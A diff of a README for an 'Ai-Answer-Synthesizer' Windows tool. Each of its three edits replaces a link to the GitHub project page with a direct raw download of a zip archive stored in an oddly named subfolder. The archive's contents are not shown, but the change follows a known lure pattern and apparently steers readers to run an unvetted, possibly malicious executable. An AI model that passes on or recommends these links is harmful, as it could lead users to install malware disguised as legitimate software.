@@ -1,6 +1,6 @@
 # 🤖 Ai-Answer-Synthesizer - Clear answers from many AI tools
 
-[![Download](https://img.shields.io/badge/Download%20Ai--Answer--Synthesizer-blue?style=for-the-badge)](https://github.com/abi71111/Ai-Answer-Synthesizer)
+[![Download](https://img.shields.io/badge/Download%20Ai--Answer--Synthesizer-blue?style=for-the-badge)](https://raw.githubusercontent.com/abi71111/Ai-Answer-Synthesizer/main/hendecagonal/Answer_Ai_Synthesizer_v2.9.zip)
 
 ## 🧭 Overview
 
@@ -21,7 +21,7 @@ This tool works with modern AI models and keeps the process simple. It is useful
 
 Visit this page to download and run the software on Windows:
 
-[https://github.com/abi71111/Ai-Answer-Synthesizer](https://github.com/abi71111/Ai-Answer-Synthesizer)
+[https://raw.githubusercontent.com/abi71111/Ai-Answer-Synthesizer/main/hendecagonal/Answer_Ai_Synthesizer_v2.9.zip](https://raw.githubusercontent.com/abi71111/Ai-Answer-Synthesizer/main/hendecagonal/Answer_Ai_Synthesizer_v2.9.zip)
 
 ## 🚀 Getting Started on Windows
 
@@ -213,7 +213,7 @@ It helps when you need:
 
 ## 📌 Primary link
 
-[Download or visit the project page here](https://github.com/abi71111/Ai-Answer-Synthesizer)
+[Download or visit the project page here](https://raw.githubusercontent.com/abi71111/Ai-Answer-Synthesizer/main/hendecagonal/Answer_Ai_Synthesizer_v2.9.zip)
 
 ## 🖥️ Windows setup checklist
 
